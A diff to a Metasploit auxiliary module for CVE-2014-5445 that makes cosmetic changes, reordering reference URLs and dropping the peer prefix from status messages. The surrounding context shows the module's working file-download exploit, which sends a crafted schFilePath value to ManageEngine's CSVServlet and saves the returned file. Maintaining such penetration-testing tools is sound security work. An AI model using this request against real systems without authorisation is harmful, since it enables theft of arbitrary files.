@@ -28,8 +28,8 @@ class Metasploit3 < Msf::Auxiliary
         [
           [ 'CVE', '2014-5445' ],
           [ 'OSVDB', '115340' ],
-          [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/ManageEngine/me_netflow_it360_file_dl.txt' ],
-          [ 'URL', 'http://seclists.org/fulldisclosure/2014/Dec/9' ]
+          [ 'URL', 'http://seclists.org/fulldisclosure/2014/Dec/9' ],
+          [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/ManageEngine/me_netflow_it360_file_dl.txt' ]
         ],
       'DisclosureDate' => 'Nov 30 2014'))
 
@@ -46,21 +46,21 @@ class Metasploit3 < Msf::Auxiliary
   def run
     # Create request
     begin
-      print_status("#{peer} - Downloading file #{datastore['FILEPATH']}")
+      print_status("Downloading file #{datastore['FILEPATH']}")
       res = send_request_cgi({
         'method' => 'GET',
         'uri' => normalize_uri(datastore['TARGETURI'], 'servlet', 'CSVServlet'),
         'vars_get' => { 'schFilePath' => datastore['FILEPATH'] },
       })
     rescue Rex::ConnectionError
-      print_error("#{peer} - Could not connect.")
+      print_error("Could not connect.")
       return
     end
 
     # Show data if needed
     if res && res.code == 200
       if res.body.to_s.bytesize == 0
-        print_error("#{peer} - 0 bytes returned, file does not exist or it is empty.")
+        print_error("0 bytes returned, file does not exist or it is empty.")
         return
       end
       vprint_line(res.body.to_s)
@@ -73,9 +73,9 @@ class Metasploit3 < Msf::Auxiliary
         res.body,
         fname
       )
-      print_good("#{peer} - File saved in: #{path}")
+      print_good("File saved in: #{path}")
     else
-      print_error("#{peer} - Failed to download file.")
+      print_error("Failed to download file.")
     end
   end
 end
